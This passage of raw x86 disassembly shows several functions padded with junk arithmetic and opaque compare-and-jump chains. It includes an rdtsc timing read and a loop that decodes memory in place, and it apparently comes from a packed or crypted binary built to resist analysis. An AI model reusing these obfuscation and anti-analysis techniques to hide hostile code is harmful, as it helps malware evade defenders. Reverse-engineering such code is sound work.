  40845e:	je     0x408480
  408460:	and    DWORD PTR [ebp-0x18],edx
  408463:	cmp    ebx,edi
  408465:	jne    0x408480
  408467:	mov    ecx,0x85f7
  40846c:	sub    ebx,ecx
  40846e:	xor    esi,esi
  408470:	test   ebx,0xc7
  408476:	je     0x408480
  408478:	or     DWORD PTR [ebp-0x18],esi
  40847b:	sub    ebx,edi
  40847d:	sub    DWORD PTR [ebp-0x18],ebx
  408480:	add    DWORD PTR [ebp-0x24],0xea778f4a
  408487:	mov    esi,DWORD PTR [ebp-0x18]
  40848a:	cmp    esi,DWORD PTR ds:0x438438
  408490:	jne    0x40850e
  408492:	add    esi,eax
  408494:	mov    edi,0x5533
  408499:	mov    ecx,DWORD PTR [ebp-0x18]
  40849c:	add    edi,esi
  40849e:	sub    ecx,edx
  4084a0:	sub    DWORD PTR [ebp-0x18],edi
  4084a3:	cmp    ecx,0x20d3
  4084a9:	jne    0x40850e
  4084ab:	mov    edx,DWORD PTR ds:0x438454
  4084b1:	mov    edi,0xbb
  4084b6:	add    DWORD PTR [ebp-0x18],edi
  4084b9:	and    DWORD PTR [ebp-0x18],edx
  4084bc:	and    ecx,edx
  4084be:	and    ecx,edx
  4084c0:	sub    ecx,eax
  4084c2:	sub    ecx,edi
  4084c4:	cmp    ecx,DWORD PTR [ebp-0x14]
  4084c7:	jne    0x40850e
  4084c9:	mov    esi,DWORD PTR [ebp-0x18]
  4084cc:	add    DWORD PTR [ebp-0x18],ecx
  4084cf:	sub    esi,ecx
  4084d1:	xor    ebx,ebx
  4084d3:	cmp    esi,0xffffffbf
  4084d6:	jne    0x40850e
  4084d8:	mov    edi,DWORD PTR [ebp-0x18]
  4084db:	add    DWORD PTR [ebp-0x18],esi
  4084de:	xor    ecx,ecx
  4084e0:	sub    edi,esi
  4084e2:	and    DWORD PTR [ebp-0x18],edi
  4084e5:	xor    DWORD PTR [ebp-0x18],esi
  4084e8:	and    ebx,eax
  4084ea:	add    DWORD PTR [ebp-0x18],ecx
  4084ed:	cmp    ebx,DWORD PTR ds:0x438438
  4084f3:	je     0x40850e
  4084f5:	cmp    ebx,DWORD PTR [ebp-0x30]
  4084f8:	je     0x40850e
  4084fa:	add    ebx,edi
  4084fc:	cmp    ebx,DWORD PTR [ebp-0xc]
  4084ff:	je     0x40850e
  408501:	cmp    ebx,0xffffffc7
  408504:	je     0x40850e
  408506:	cmp    ebx,0xffffffc6
  408509:	je     0x40850e
  40850b:	sub    DWORD PTR [ebp-0x18],ebx
  40850e:	lea    edx,[eax+0x730]
  408514:	sub    DWORD PTR [ebp-0x18],edx
  408517:	inc    edx
  408518:	add    DWORD PTR [ebp-0x18],ecx
  40851b:	mov    eax,DWORD PTR [edx]
  40851d:	cmp    edx,DWORD PTR [ebp-0x1c]
  408520:	jne    0x408548
  408522:	mov    esi,eax
  408524:	and    esi,edx
  408526:	cmp    esi,DWORD PTR [ebp-0x1c]
  408529:	jne    0x408548
  40852b:	mov    ebx,DWORD PTR [ebp-0x18]
  40852e:	mov    edi,DWORD PTR [ebp-0x18]
  408531:	add    DWORD PTR [ebp-0x18],esi
  408534:	cmp    edi,DWORD PTR [ebp-0xc]
  408537:	je     0x408548
  408539:	add    ebx,edi
  40853b:	cmp    ebx,0x2597
  408541:	jne    0x408548
  408543:	sub    ebx,eax
  408545:	xor    DWORD PTR [ebp-0x18],ebx
  408548:	sub    eax,0x26ab8cfe
  40854d:	cmp    eax,DWORD PTR [ebp-0x30]
  408550:	jne    0x408555
  408552:	sub    DWORD PTR [ebp-0x18],eax
  408555:	cmp    eax,0xcdd9af01
  40855a:	jne    0x408514
  40855c:	cmp    eax,DWORD PTR ds:0x438438
  408562:	je     0x4085be
  408564:	mov    esi,eax
  408566:	mov    ecx,0x3b1c
  40856b:	test   esi,0x9f
  408571:	je     0x4085be
  408573:	mov    ebx,0x7a
  408578:	mov    eax,edi
  40857a:	cmp    edi,0x7c
  40857d:	jne    0x4085be
  40857f:	mov    edi,0xb4
  408584:	xor    DWORD PTR [ebp-0x18],esi
  408587:	and    DWORD PTR [ebp-0x18],edx
  40858a:	sub    eax,edx
  40858c:	sub    eax,ecx
  40858e:	add    DWORD PTR [ebp-0x18],edi
  408591:	cmp    edx,0xffffffe6
  408594:	je     0x4085be
  408596:	mov    edi,DWORD PTR [ebp-0x18]
  408599:	mov    ecx,DWORD PTR [ebp-0x18]
  40859c:	or     DWORD PTR [ebp-0x18],ebx
  40859f:	add    DWORD PTR [ebp-0x18],edi
  4085a2:	or     ecx,edi
  4085a4:	cmp    ecx,edx
  4085a6:	jne    0x4085be
  4085a8:	mov    edi,ecx
  4085aa:	sub    DWORD PTR [ebp-0x18],edi
  4085ad:	mov    esi,0xa4
  4085b2:	sub    DWORD PTR [ebp-0x18],esi
  4085b5:	add    eax,edi
  4085b7:	and    eax,ebx
  4085b9:	or     eax,ebx
  4085bb:	sub    DWORD PTR [ebp-0x18],eax
  4085be:	mov    eax,DWORD PTR [edx+0x4]
  4085c1:	and    ebx,esi
  4085c3:	xor    edx,edx
  4085c5:	mov    edi,DWORD PTR [ebp-0x18]
  4085c8:	or     DWORD PTR [ebp-0x18],edi
  4085cb:	cmp    edi,0x56
  4085ce:	jne    0x4085e3
  4085d0:	mov    edi,0x4621200a
  4085d5:	xor    DWORD PTR [ebp-0x18],edi
  4085d8:	and    ebx,esi
  4085da:	add    ebx,edx
  4085dc:	mov    edi,eax
  4085de:	and    edi,ebx
  4085e0:	sub    DWORD PTR [ebp-0x18],edi
  4085e3:	sub    DWORD PTR [ebp-0x24],eax
  4085e6:	push   0xffffffce
  4085e8:	push   0x48
  4085ea:	push   0xf2ad6d00
  4085ef:	push   0x3612ff00
  4085f4:	call   0x409461
  4085f9:	add    esp,0x10
  4085fc:	mov    DWORD PTR [ebp-0x18],eax
  4085ff:	push   0x40d8d000
  408604:	push   0xa237e100
  408609:	push   0xffffffac
  40860b:	call   0x409bc5
  408610:	add    esp,0xc
  408613:	mov    edx,DWORD PTR [ebp+0xc]
  408616:	mov    esi,eax
  408618:	xor    DWORD PTR [ebp-0x18],esi
  40861b:	mov    ebx,DWORD PTR [ebp-0x24]
  40861e:	and    eax,edi
  408620:	cmp    esi,DWORD PTR [ebp-0x30]
  408623:	je     0x408671
  408625:	mov    ecx,DWORD PTR ds:0x438438
  40862b:	add    ecx,edi
  40862d:	mov    esi,DWORD PTR [ebp-0x18]
  408630:	cmp    ebx,0xffffff87
  408633:	je     0x408671
  408635:	mov    edi,DWORD PTR [ebp-0x18]
  408638:	add    DWORD PTR [ebp-0x18],edi
  40863b:	add    ecx,edx
  40863d:	cmp    ebx,0x56
  408640:	je     0x408671
  408642:	add    eax,ecx
  408644:	mov    ecx,DWORD PTR [ebp-0x18]
  408647:	cmp    ecx,0x25b5
  40864d:	jne    0x408671
  40864f:	add    DWORD PTR [ebp-0x18],edi
  408652:	sub    DWORD PTR [ebp-0x18],ebx
  408655:	or     DWORD PTR [ebp-0x18],ecx
  408658:	sub    DWORD PTR [ebp-0x18],esi
  40865b:	add    eax,ebx
  40865d:	cmp    eax,0xffffffba
  408660:	jne    0x408671
  408662:	mov    edi,DWORD PTR ds:0x438438
  408668:	sub    DWORD PTR [ebp-0x18],esi
  40866b:	and    DWORD PTR [ebp-0x18],eax
  40866e:	mov    DWORD PTR [ebp-0x18],edi
  408671:	mov    DWORD PTR [edx+0x0],ebx
  408674:	push   0x1b
  408676:	push   0x2acc9e00
  40867b:	push   0xffffffcf
  40867d:	push   0x40c10100
  408682:	push   0xffffffa0
  408684:	call   0x40957c
  408689:	add    esp,0x14
  40868c:	push   0x38
  40868e:	call   0x40980d
  408693:	add    esp,0x4
  408696:	push   0x1d
  408698:	call   0x409736
  40869d:	add    esp,0x4
  4086a0:	call   0x409aad
  4086a5:	pop    edi
  4086a6:	push   0x62
  4086a8:	push   0x564a2400
  4086ad:	push   0x426d4b00
  4086b2:	push   0x8a16e300
  4086b7:	push   0x70d09c00
  4086bc:	call   0x40980d
  4086c1:	add    esp,0x14
  4086c4:	push   0x7e
  4086c6:	call   0x40980d
  4086cb:	add    esp,0x4
  4086ce:	pop    esi
  4086cf:	mov    ebx,DWORD PTR [ebp-0x18]
  4086d2:	push   0xffffffa8
  4086d4:	push   0xde5f0700
  4086d9:	push   0x52961c00
  4086de:	call   0x40957c
  4086e3:	add    esp,0xc
  4086e6:	sub    DWORD PTR [ebp-0x18],edi
  4086e9:	push   0x54
  4086eb:	push   0xeaef5800
  4086f0:	push   0x2b
  4086f2:	call   0x409461
  4086f7:	add    esp,0xc
  4086fa:	or     ebx,eax
  4086fc:	sub    DWORD PTR [ebp-0x18],ebx
  4086ff:	pop    ebx
  408700:	mov    ecx,DWORD PTR ds:0x438438
  408706:	push   0xda788d00
  40870b:	push   0xc66ff300
  408710:	push   0x74
  408712:	push   0xd2899b00
  408717:	call   0x40957c
  40871c:	add    esp,0x10
  40871f:	leave  
  408720:	ret    0x8
  408723:	int3   
  408724:	int3   
  408725:	int3   
  408726:	int3   
  408727:	int3   
  408728:	push   ebp
  408729:	mov    ebp,esp
  40872b:	sub    esp,0x3c
  40872e:	mov    edx,0xca
  408733:	mov    DWORD PTR [ebp-0x10],edx
  408736:	push   0x25
  408738:	call   0x409967
  40873d:	add    esp,0x4
  408740:	push   ebx
  408741:	push   0x8e5b9c00
  408746:	push   0x30cff600
  40874b:	call   0x409aad
  408750:	add    esp,0x8
  408753:	push   esi
  408754:	push   0x3f
  408756:	call   0x409967
  40875b:	add    esp,0x4
  40875e:	push   0xffffffda
  408760:	call   0x40957c
  408765:	add    esp,0x4
  408768:	push   edi
  408769:	cmp    eax,0x71
  40876c:	jne    0x408780
  40876e:	mov    edx,DWORD PTR [ebp-0x10]
  408771:	push   0x70
  408773:	push   0x8a52a800
  408778:	call   0x40980d
  40877d:	add    esp,0x8
  408780:	call   0x409461
  408785:	mov    ebx,DWORD PTR [ebp-0x10]
  408788:	cmp    ebx,0x7b
  40878b:	je     0x40886f
  408791:	cmp    ebx,eax
  408793:	jne    0x40886f
  408799:	cmp    eax,0x57
  40879c:	jne    0x40886f
  4087a2:	push   0xaa5ab700
  4087a7:	push   0xbd1e00
  4087ac:	push   0xffffffb6
  4087ae:	push   0x3d
  4087b0:	call   0x409967
  4087b5:	add    esp,0x10
  4087b8:	mov    esi,DWORD PTR ds:0x438434
  4087be:	mov    edi,DWORD PTR [ebp-0x10]
  4087c1:	push   0x5f
  4087c3:	push   0xa0eb4700
  4087c8:	push   0x3a1ec700
  4087cd:	call   0x40957c
  4087d2:	add    esp,0xc
  4087d5:	push   0xffffffe8
  4087d7:	push   0x9e6a9c00
  4087dc:	push   0xf2c95600
  4087e1:	push   0xe
  4087e3:	push   0x45
  4087e5:	call   0x409736
  4087ea:	add    esp,0x14
  4087ed:	sub    DWORD PTR [ebp-0x10],ebx
  4087f0:	push   0x1d
  4087f2:	push   0xffffff97
  4087f4:	push   0xf0d75300
  4087f9:	push   0x3e4a6b00
  4087fe:	push   0x221b100
  408803:	call   0x409bc5
  408808:	add    esp,0x14
  40880b:	add    DWORD PTR [ebp-0x10],ebx
  40880e:	push   0x5d
  408810:	push   0x611c300
  408815:	call   0x409461
  40881a:	add    esp,0x8
  40881d:	push   0xce568a00
  408822:	push   0x3085ea00
  408827:	push   0xffffffed
  408829:	push   0x8
  40882b:	push   0x51
  40882d:	call   0x409bc5
  408832:	add    esp,0x14
  408835:	push   0x7a181c00
  40883a:	push   0x60895900
  40883f:	push   0x323c0b00
  408844:	push   0xbe3b8c00
  408849:	push   0x5091e500
  40884e:	call   0x409d18
  408853:	add    esp,0x14
  408856:	or     esi,edi
  408858:	add    esi,edi
  40885a:	push   0x1e146c00
  40885f:	push   0xce4b4f00
  408864:	call   0x409967
  408869:	add    esp,0x8
  40886c:	add    DWORD PTR [ebp-0x10],esi
  40886f:	push   0xffffffcd
  408871:	push   0x80bbcc00
  408876:	push   0xfffffffd
  408878:	call   0x409736
  40887d:	add    esp,0xc
  408880:	test   edi,0x91fb
  408886:	jne    0x408897
  408888:	cmp    edi,DWORD PTR [ebp-0x24]
  40888b:	je     0x408897
  40888d:	push   0x48
  40888f:	call   0x409461
  408894:	add    esp,0x4
  408897:	push   0x30
  408899:	push   0x25
  40889b:	push   0x522d7500
  4088a0:	push   0xffffffd3
  4088a2:	call   0x409967
  4088a7:	add    esp,0x10
  4088aa:	rdtsc  
  4088ac:	mov    ecx,0xd9
  4088b1:	mov    edi,0x87
  4088b6:	sub    ecx,esi
  4088b8:	add    DWORD PTR [ebp-0x10],ecx
  4088bb:	sub    DWORD PTR [ebp-0x10],eax
  4088be:	sub    edi,edx
  4088c0:	xor    DWORD PTR [ebp-0x10],edi
  4088c3:	and    edi,esi
  4088c5:	mov    edx,DWORD PTR ds:0x438434
  4088cb:	mov    DWORD PTR [ebp-0x4],edx
  4088ce:	test   edi,0x0
  4088d4:	jne    0x40894b
  4088d6:	or     edi,ecx
  4088d8:	cmp    edi,0x28f4
  4088de:	je     0x40894b
  4088e0:	cmp    edi,DWORD PTR [ebp-0x4]
  4088e3:	je     0x40894b
  4088e5:	mov    edx,DWORD PTR [ebp-0x4]
  4088e8:	mov    esi,0xff
  4088ed:	add    edx,edi
  4088ef:	sub    DWORD PTR [ebp-0x4],esi
  4088f2:	test   edx,0x72
  4088f8:	jne    0x40894b
  4088fa:	mov    esi,DWORD PTR [ebp-0x4]
  4088fd:	sub    DWORD PTR [ebp-0x10],ebx
  408900:	sub    DWORD PTR [ebp-0x10],ecx
  408903:	mov    edi,DWORD PTR [ebp-0x10]
  408906:	cmp    edx,DWORD PTR ds:0x438434
  40890c:	je     0x40894b
  40890e:	sub    DWORD PTR [ebp-0x10],esi
  408911:	mov    ecx,DWORD PTR [ebp-0x4]
  408914:	mov    ebx,edx
  408916:	add    ecx,edx
  408918:	cmp    edi,edx
  40891a:	jne    0x40894b
  40891c:	mov    edx,0x44
  408921:	cmp    ecx,0xc7eb
  408927:	je     0x40894b
  408929:	sub    DWORD PTR [ebp-0x10],ebx
  40892c:	mov    esi,DWORD PTR [ebp-0x4]
  40892f:	xor    ebx,ebx
  408931:	add    edx,edx
  408933:	mov    DWORD PTR [ebp-0x10],eax
  408936:	add    edi,esi
  408938:	and    ecx,edi
  40893a:	sub    ecx,eax
  40893c:	add    ecx,edx
  40893e:	add    DWORD PTR [ebp-0x4],eax
  408941:	sub    DWORD PTR [ebp-0x10],ecx
  408944:	add    ebx,esi
  408946:	or     ebx,ecx
  408948:	sub    DWORD PTR [ebp-0x10],ebx
  40894b:	add    DWORD PTR [ebp-0x4],ebx
  40894e:	pop    edi
  40894f:	cmp    ebx,DWORD PTR ds:0x438434
  408955:	je     0x408981
  408957:	mov    esi,0x53
  40895c:	mov    edx,DWORD PTR [ebp-0x10]
  40895f:	sub    DWORD PTR [ebp-0x10],edx
  408962:	cmp    edi,DWORD PTR [ebp-0x18]
  408965:	je     0x408981
  408967:	mov    edx,DWORD PTR [ebp-0x10]
  40896a:	and    edx,edi
  40896c:	mov    ecx,0x4200122d
  408971:	add    DWORD PTR [ebp-0x10],ecx
  408974:	add    edx,edx
  408976:	sub    DWORD PTR [ebp-0x4],esi
  408979:	cmp    edx,0x65
  40897c:	jne    0x408981
  40897e:	add    DWORD PTR [ebp-0x4],edx
  408981:	pop    esi
  408982:	add    ecx,ebx
  408984:	cmp    ecx,DWORD PTR ds:0x438434
  40898a:	je     0x4089d6
  40898c:	add    ecx,esi
  40898e:	cmp    edi,DWORD PTR [ebp-0x4]
  408991:	jne    0x4089d6
  408993:	xor    edx,edx
  408995:	and    edx,esi
  408997:	mov    ebx,0x5240e001
  40899c:	or     edx,esi
  40899e:	add    edx,eax
  4089a0:	and    DWORD PTR [ebp-0x4],ebx
  4089a3:	mov    DWORD PTR [ebp-0x4],ecx
  4089a6:	sub    edx,eax
  4089a8:	cmp    edx,DWORD PTR [ebp-0x38]
  4089ab:	jne    0x4089d6
  4089ad:	mov    ecx,DWORD PTR [ebp-0x4]
  4089b0:	mov    ebx,0xf3
  4089b5:	sub    DWORD PTR [ebp-0x4],edx
  4089b8:	or     ecx,ebx
  4089ba:	test   ecx,0x32
  4089c0:	jne    0x4089d6
  4089c2:	mov    ebx,DWORD PTR [ebp-0x10]
  4089c5:	xor    edx,edx
  4089c7:	add    DWORD PTR [ebp-0x4],ecx
  4089ca:	add    edx,edx
  4089cc:	add    DWORD PTR [ebp-0x10],ebx
  4089cf:	add    edx,eax
  4089d1:	add    edx,ecx
  4089d3:	add    DWORD PTR [ebp-0x4],edx
  4089d6:	pop    ebx
  4089d7:	mov    ecx,DWORD PTR ds:0x438434
  4089dd:	mov    edx,0xf0005146
  4089e2:	test   ebx,0x1a
  4089e8:	je     0x408a16
  4089ea:	sub    ecx,edi
  4089ec:	add    ecx,esi
  4089ee:	and    DWORD PTR [ebp-0x4],edx
  4089f1:	add    DWORD PTR [ebp-0x10],ebx
  4089f4:	cmp    ecx,DWORD PTR [ebp-0x2c]
  4089f7:	jne    0x408a16
  4089f9:	xor    DWORD PTR [ebp-0x4],ebx
  4089fc:	and    ecx,edi
  4089fe:	cmp    edi,0x2435
  408a04:	je     0x408a16
  408a06:	mov    edx,0x1b
  408a0b:	add    edx,esi
  408a0d:	sub    edx,ecx
  408a0f:	and    edx,edi
  408a11:	and    edx,ecx
  408a13:	or     DWORD PTR [ebp-0x10],edx
  408a16:	leave  
  408a17:	ret    
  408a18:	int3   
  408a19:	int3   
  408a1a:	int3   
  408a1b:	int3   
  408a1c:	int3   
  408a1d:	push   ebp
  408a1e:	mov    ebp,esp
  408a20:	sub    esp,0x28
  408a23:	push   0x2a64d300
  408a28:	push   0x6f
  408a2a:	push   0x2f
  408a2c:	call   0x409d18
  408a31:	add    esp,0xc
  408a34:	push   0xffffff80
  408a36:	call   0x409bc5
  408a3b:	add    esp,0x4
  408a3e:	push   ebx
  408a3f:	push   0x34
  408a41:	push   0x47
  408a43:	push   0xffffffbd
  408a45:	call   0x409736
  408a4a:	add    esp,0xc
  408a4d:	push   esi
  408a4e:	mov    eax,0xcb38
  408a53:	call   0x40957c
  408a58:	push   0x7d
  408a5a:	push   0xc0f76300
  408a5f:	call   0x409967
  408a64:	add    esp,0x8
  408a67:	push   edi
  408a68:	mov    esi,0xbd
  408a6d:	mov    DWORD PTR [ebp-0x24],esi
  408a70:	push   0xba448700
  408a75:	push   0xffffff99
  408a77:	push   0xffffffee
  408a79:	push   0x46
  408a7b:	push   0xb0ffcd00
  408a80:	call   0x409d18
  408a85:	add    esp,0x14
  408a88:	xor    edx,edx
  408a8a:	call   0x40957c
  408a8f:	mov    ecx,DWORD PTR [ebp+0x10]
  408a92:	or     esi,eax
  408a94:	mov    edx,DWORD PTR ds:0x438464
  408a9a:	and    edx,eax
  408a9c:	mov    ebx,DWORD PTR [ebp-0x24]
  408a9f:	test   ecx,0x1f
  408aa5:	jne    0x408c46
  408aab:	add    esi,edx
  408aad:	xor    edx,edx
  408aaf:	add    edx,ecx
  408ab1:	mov    edi,DWORD PTR [ebp-0x24]
  408ab4:	test   edx,0xcd
  408aba:	je     0x408c46
  408ac0:	mov    eax,DWORD PTR ds:0x438464
  408ac6:	cmp    esi,DWORD PTR [ebp-0x4]
  408ac9:	jne    0x408c46
  408acf:	add    edi,edx
  408ad1:	mov    edx,DWORD PTR [ebp-0x24]
  408ad4:	sub    ebx,edi
  408ad6:	mov    edi,DWORD PTR ds:0x438464
  408adc:	sub    DWORD PTR [ebp-0x24],esi
  408adf:	sub    DWORD PTR [ebp-0x24],edi
  408ae2:	and    DWORD PTR [ebp-0x24],eax
  408ae5:	add    ebx,ecx
  408ae7:	sub    DWORD PTR [ebp-0x24],edx
  408aea:	add    ebx,esi
  408aec:	cmp    ebx,DWORD PTR ds:0x438464
  408af2:	je     0x408c46
  408af8:	add    ebx,ecx
  408afa:	mov    edx,DWORD PTR [ebp-0x24]
  408afd:	mov    eax,DWORD PTR [ebp-0x24]
  408b00:	sub    edx,ecx
  408b02:	mov    DWORD PTR [ebp-0x24],edi
  408b05:	test   edx,0xee
  408b0b:	jne    0x408c46
  408b11:	mov    edi,0x57cb
  408b16:	mov    esi,DWORD PTR ds:0x43845c
  408b1c:	cmp    ebx,DWORD PTR [ebp-0x18]
  408b1f:	je     0x408c46
  408b25:	or     esi,edi
  408b27:	test   edx,0x12400041
  408b2d:	je     0x408c46
  408b33:	cmp    edx,DWORD PTR ds:0x438464
  408b39:	je     0x408c46
  408b3f:	add    DWORD PTR [ebp-0x24],eax
  408b42:	add    DWORD PTR [ebp-0x24],edx
  408b45:	sub    esi,eax
  408b47:	mov    edi,DWORD PTR ds:0x438448
  408b4d:	mov    eax,DWORD PTR ds:0x438448
  408b53:	sub    DWORD PTR [ebp-0x24],edi
  408b56:	cmp    esi,edx
  408b58:	je     0x408c46
  408b5e:	sub    ebx,edx
  408b60:	mov    eax,DWORD PTR [ebp-0x24]
  408b63:	mov    edi,DWORD PTR [ebp-0x24]
  408b66:	cmp    edi,0xffffff85
  408b69:	jne    0x408c46
  408b6f:	add    edi,eax
  408b71:	mov    edx,DWORD PTR [ebp-0x24]
  408b74:	mov    eax,DWORD PTR [ebp-0x24]
  408b77:	cmp    ebx,DWORD PTR [ebp-0x4]
  408b7a:	jne    0x408c46
  408b80:	sub    DWORD PTR [ebp-0x24],ebx
  408b83:	sub    DWORD PTR [ebp-0x24],edi
  408b86:	and    DWORD PTR [ebp-0x24],edx
  408b89:	mov    edi,DWORD PTR ds:0x438464
  408b8f:	test   esi,0xfd
  408b95:	je     0x408c46
  408b9b:	mov    ebx,DWORD PTR [ebp-0x24]
  408b9e:	cmp    eax,0xfffffffd
  408ba1:	jne    0x408c46
  408ba7:	cmp    eax,0x42ea
  408bac:	je     0x408c46
  408bb2:	cmp    ebx,0x67
  408bb5:	jne    0x408c46
  408bbb:	add    DWORD PTR [ebp-0x24],edx
  408bbe:	mov    edx,0xc
  408bc3:	test   esi,0x9a
  408bc9:	jne    0x408c46
  408bcb:	sub    DWORD PTR [ebp-0x24],esi
  408bce:	cmp    eax,DWORD PTR ds:0x438448
  408bd4:	jne    0x408c46
  408bd6:	add    DWORD PTR [ebp-0x24],edi
  408bd9:	mov    edi,DWORD PTR [ebp-0x24]
  408bdc:	add    DWORD PTR [ebp-0x24],eax
  408bdf:	add    edx,ecx
  408be1:	cmp    ebx,0x71
  408be4:	je     0x408c46
  408be6:	add    ebx,eax
  408be8:	mov    eax,DWORD PTR [ebp-0x24]
  408beb:	cmp    eax,0xffffff9a
  408bee:	jne    0x408c46
  408bf0:	xor    DWORD PTR [ebp-0x24],eax
  408bf3:	sub    DWORD PTR [ebp-0x24],edx
  408bf6:	sub    DWORD PTR [ebp-0x24],ecx
  408bf9:	sub    ebx,eax
  408bfb:	sub    DWORD PTR [ebp-0x24],ebx
  408bfe:	or     edi,edx
  408c00:	and    DWORD PTR [ebp-0x24],ebx
  408c03:	xor    DWORD PTR [ebp-0x24],eax
  408c06:	mov    ebx,DWORD PTR [ebp-0x24]
  408c09:	sub    ebx,edi
  408c0b:	test   ebx,0xd3
  408c11:	je     0x408c46
  408c13:	mov    edx,DWORD PTR [ebp-0x24]
  408c16:	mov    eax,ecx
  408c18:	sub    eax,ebx
  408c1a:	and    edx,eax
  408c1c:	and    edx,eax
  408c1e:	sub    DWORD PTR [ebp-0x24],ebx
  408c21:	cmp    edx,0xffffff94
  408c24:	jne    0x408c46
  408c26:	mov    eax,0xc
  408c2b:	sub    edx,ecx
  408c2d:	add    eax,esi
  408c2f:	cmp    edx,DWORD PTR ds:0x438464
  408c35:	je     0x408c46
  408c37:	xor    esi,esi
  408c39:	sub    eax,edx
  408c3b:	cmp    eax,DWORD PTR [ebp-0x18]
  408c3e:	je     0x408c46
  408c40:	sub    DWORD PTR [ebp-0x24],eax
  408c43:	sub    DWORD PTR [ebp-0x24],esi
  408c46:	mov    edx,DWORD PTR [ebp+0x8]
  408c49:	sub    eax,edx
  408c4b:	mov    ebx,esi
  408c4d:	mov    esi,DWORD PTR [ebp-0x24]
  408c50:	or     DWORD PTR [ebp-0x24],eax
  408c53:	sub    ebx,esi
  408c55:	sub    ebx,edx
  408c57:	mov    DWORD PTR [ebp-0x24],eax
  408c5a:	cmp    ebx,DWORD PTR [ebp-0x10]
  408c5d:	je     0x408c6f
  408c5f:	mov    eax,DWORD PTR [ebp-0x24]
  408c62:	add    DWORD PTR [ebp-0x24],eax
  408c65:	add    ebx,edi
  408c67:	cmp    ebx,DWORD PTR [ebp-0x18]
  408c6a:	jne    0x408c6f
  408c6c:	mov    DWORD PTR [ebp-0x24],ebx
  408c6f:	cmp    DWORD PTR [ebp+0xc],ecx
  408c72:	je     0x408cc6
  408c74:	cmp    esi,0x939d
  408c7a:	je     0x408c85
  408c7c:	mov    ebx,DWORD PTR ds:0x438444
  408c82:	sub    DWORD PTR [ebp-0x24],ebx
  408c85:	dec    DWORD PTR [ebp+0xc]
  408c88:	sub    DWORD PTR [ebp-0x24],edi
  408c8b:	sub    DWORD PTR [edx],ecx
  408c8d:	mov    ebx,DWORD PTR [ebp-0x24]
  408c90:	sub    ebx,eax
  408c92:	test   ebx,0x87
  408c98:	jne    0x408c9f
  408c9a:	sub    ebx,ecx
  408c9c:	sub    DWORD PTR [ebp-0x24],ebx
  408c9f:	ror    DWORD PTR [edx],0x0
  408ca2:	add    DWORD PTR [ebp-0x24],ebx
  408ca5:	add    edx,0x4
  408ca8:	mov    ebx,DWORD PTR ds:0x438464
  408cae:	add    DWORD PTR [ebp-0x24],edx
  408cb1:	cmp    eax,DWORD PTR [ebp-0x24]
  408cb4:	jne    0x408cc1
  408cb6:	cmp    esi,0xa596
  408cbc:	je     0x408cc1
  408cbe:	xor    DWORD PTR [ebp-0x24],edx
  408cc1:	mov    DWORD PTR [ebp-0x24],ebx
  408cc4:	jmp    0x408c49
  408cc6:	or     DWORD PTR [ebp-0x24],ecx
  408cc9:	push   0x6d
  408ccb:	call   0x409736
  408cd0:	add    esp,0x4
  408cd3:	push   0xa21b6600
  408cd8:	push   0xa0a22b00
  408cdd:	push   0x16
  408cdf:	push   0x52f82000
  408ce4:	call   0x409aad
  408ce9:	add    esp,0x10
  408cec:	push   0xf2f9c100
  408cf1:	push   0xffffffd1
  408cf3:	call   0x409aad
  408cf8:	add    esp,0x8
  408cfb:	add    DWORD PTR [ebp-0x24],eax
  408cfe:	push   0x19
  408d00:	call   0x409aad
  408d05:	add    esp,0x4
  408d08:	pop    edi
  408d09:	mov    eax,DWORD PTR [ebp-0x24]
  408d0c:	push   0x1a670600
  408d11:	call   0x409aad
  408d16:	add    esp,0x4
  408d19:	pop    esi
  408d1a:	sub    DWORD PTR [ebp-0x24],edi
  408d1d:	push   0xaaccdf00
  408d22:	push   0x0
  408d24:	push   0xffffffa8
  408d26:	call   0x40980d
  408d2b:	add    esp,0xc
  408d2e:	pop    ebx
  408d2f:	push   0xd2bea600
  408d34:	push   0xf2963800
  408d39:	call   0x40980d
  408d3e:	add    esp,0x8
  408d41:	leave  
  408d42:	ret    0xc
  408d45:	int3   
  408d46:	int3   
  408d47:	int3   
  408d48:	int3   
  408d49:	int3   
  408d4a:	push   ebp
  408d4b:	mov    ebp,esp
  408d4d:	sub    esp,0x38
  408d50:	mov    edx,0xfd
  408d55:	call   0x409aad
  408d5a:	push   0xee1fde00
  408d5f:	call   0x40980d
  408d64:	add    esp,0x4
  408d67:	push   ebx
  408d68:	mov    DWORD PTR [ebp-0x28],eax
  408d6b:	push   esi
  408d6c:	push   0x10ba7100
  408d71:	push   0x7c
  408d73:	push   0xffffffd3
  408d75:	call   0x409461
  408d7a:	add    esp,0xc
  408d7d:	push   edi
  408d7e:	push   0xffffffdd
  408d80:	push   0x3d
  408d82:	push   0xf6632d00
  408d87:	push   0x6a9e2300
  408d8c:	push   0x26
  408d8e:	call   0x409aad
  408d93:	add    esp,0x14
  408d96:	mov    edi,0xa0ad
  408d9b:	push   0x1e
  408d9d:	push   0x7e3fd800
  408da2:	push   0xffffffc0
  408da4:	push   0x4661e600
  408da9:	push   0xffffffdb
  408dab:	call   0x409aad
  408db0:	add    esp,0x14
  408db3:	mov    esi,DWORD PTR [ebp-0x28]
  408db6:	call   0x409461
  408dbb:	push   0xeae65500
  408dc0:	push   0x52405c00
  408dc5:	push   0x3f
  408dc7:	call   0x40957c
  408dcc:	add    esp,0xc
  408dcf:	add    DWORD PTR [ebp-0x28],edi
  408dd2:	push   0xf2fc0500
  408dd7:	push   0xa647800
  408ddc:	push   0xffffffab
  408dde:	call   0x409461
  408de3:	add    esp,0xc
  408de6:	sub    esi,eax
  408de8:	call   0x409736
  408ded:	sub    esi,eax
  408def:	push   0x96723e00
  408df4:	push   0x51
  408df6:	push   0x5
  408df8:	push   0x50e89700
  408dfd:	push   0xffffffe5
  408dff:	call   0x409bc5
  408e04:	add    esp,0x14
  408e07:	push   0xffffffa8
  408e09:	push   0xffffffae
  408e0b:	push   0xf2fc1900
  408e10:	call   0x409461
  408e15:	add    esp,0xc
  408e18:	mov    DWORD PTR [ebp-0x28],esi
  408e1b:	mov    edi,0xd05fd73b
  408e20:	push   0xffffffa2
  408e22:	push   0xffffffaa
  408e24:	push   0xffffffce
  408e26:	call   0x409461
  408e2b:	add    esp,0xc
  408e2e:	push   0xf2d29800
  408e33:	call   0x409bc5
  408e38:	add    esp,0x4
  408e3b:	sub    edi,0xd05fd6fb
  408e41:	add    eax,esi
  408e43:	mov    edx,DWORD PTR ds:0x43844c
  408e49:	push   0xda7c1200
  408e4e:	push   0x17
  408e50:	push   0xc6021c00
  408e55:	call   0x409aad
  408e5a:	add    esp,0xc
  408e5d:	push   0xaac6d400
  408e62:	push   0x27
